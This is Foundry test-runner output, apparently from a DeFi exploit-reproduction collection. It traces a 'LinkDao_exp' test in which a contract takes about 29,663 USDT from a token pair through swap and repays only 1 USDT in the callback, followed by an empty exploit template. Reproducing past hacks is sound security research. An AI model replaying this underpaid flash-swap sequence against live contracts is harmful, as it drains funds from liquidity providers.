Compiling 27 files with Solc 0.8.25
Solc 0.8.25 finished in 1.03s
Compiler run successful!

Ran 1 test for src/test/2023-11/LinkDao_exp.sol:LinkDao_exp
[PASS] test() (gas: 79480)
Traces:
  [82280] LinkDao_exp::test()
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de) [staticcall]
    │   └─ ← [Return] 29962986000000000000000 [2.996e22]
    ├─ [73704] 0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de::swap(29663356140000000000000 [2.966e22], 0, LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x313233)
    │   ├─ [10871] 0x55d398326f99059fF775485246999027B3197955::transfer(LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 29663356140000000000000 [2.966e22])
    │   │   ├─ emit Transfer(from: 0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de, to: LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 29663356140000000000000 [2.966e22])
    │   │   └─ ← [Return] true
    │   ├─ [4059] LinkDao_exp::dc6eaaa9(0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000006480dc31e222a6ac0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000033132330000000000000000000000000000000000000000000000000000000000)
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de, 1000000000000000000 [1e18])
    │   │   │   ├─ emit Transfer(from: LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de, value: 1000000000000000000 [1e18])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de) [staticcall]
    │   │   └─ ← [Return] 300629860000000000000 [3.006e20]
    │   ├─ [2531] 0xaF027427DC6d31A3e7e162A710a5Fe27e63E275F::balanceOf(0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de) [staticcall]
    │   │   └─ ← [Return] 48277499838300344044804 [4.827e22]
    │   ├─ [2315] 0x717D0A192F4C5F9Bc8A2D45b01D696Dab2bD1b7A::getFeePercentage() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000019
    │   ├─ [2359] 0x717D0A192F4C5F9Bc8A2D45b01D696Dab2bD1b7A::getTreasuryPercentage() [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000003e8
    │   ├─ [2336] 0x717D0A192F4C5F9Bc8A2D45b01D696Dab2bD1b7A::ce0a653a() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000bb8
    │   ├─ [2327] 0x717D0A192F4C5F9Bc8A2D45b01D696Dab2bD1b7A::getTotalFeePercentage() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000002710
    │   ├─ emit Sync(: 300629860000000000000 [3.006e20], : 48277499838300344044804 [4.827e22])
    │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986000000000000 [9.86e14])
    │   │   ├─ emit Transfer(from: 0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de, to: LinkDao_exp: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 986000000000000 [9.86e14])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000008c1e7895f10000000000000000000000000000000000000000000000000000000000000000000
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 256.41ms (1.04ms CPU time)

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 265.11ms (137.00µs CPU time)

Ran 2 test suites in 578.36ms (521.52ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
